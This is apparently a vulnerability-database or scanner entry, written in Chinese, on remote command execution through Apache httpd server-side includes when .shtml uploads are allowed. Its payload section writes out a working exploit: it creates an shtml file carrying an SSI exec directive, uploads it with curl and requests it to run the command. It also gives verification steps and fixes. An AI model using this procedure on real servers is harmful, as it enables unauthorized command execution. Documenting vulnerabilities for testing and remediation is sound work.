---
id: HTTPD-SSI-RCE
title: Apache HTTP Server SSI 远程命令执行漏洞
product: httpd
vendor: Apache
version_affected: "不适用（取决于 mod_include/mod_cgi 配置，非版本边界）"
severity: CRITICAL
tags: [rce, ssi, 无需认证]
fingerprint: ["Apache", "httpd"]
---

## 漏洞描述

Apache HTTP Server 开启了服务器端包含（SSI）和 CGI 功能时，攻击者可以上传 SHTML 文件并使用 `<!--#exec cmd="命令" -->` 执行任意命令。

## 影响版本

- 无版本边界：这是配置问题而非版本漏洞。仅当启用 SSI（`mod_include`）与 CGI（`mod_cgi`）并允许上传 `.shtml` 时才成立，Apache HTTP Server 各版本均可能受影响。请针对目标实测确认，而非按版本筛选。

## 前置条件

- 无需认证
- 服务器开启了 SSI 和 CGI 支持
- 存在文件上传功能

## 利用步骤

1. 上传 .shtml 文件
2. 访问文件触发 SSI 命令执行

## Payload

```bash
# 创建恶意 shtml 文件
echo '<!--#exec cmd="ls" -->' > shell.shtml

# 上传
curl -X POST "http://target:8080/upload.php" -F "file=@shell.shtml"

# 访问执行
curl "http://target:8080/uploads/shell.shtml"
```

## 验证方法

```bash
# 检查命令执行结果
curl -s "http://target:8080/uploads/shell.shtml"
```

## 修复建议

1. 禁用 SSI 的 exec 功能
2. 限制上传目录的脚本执行权限
3. 使用白名单方式限制上传文件类型
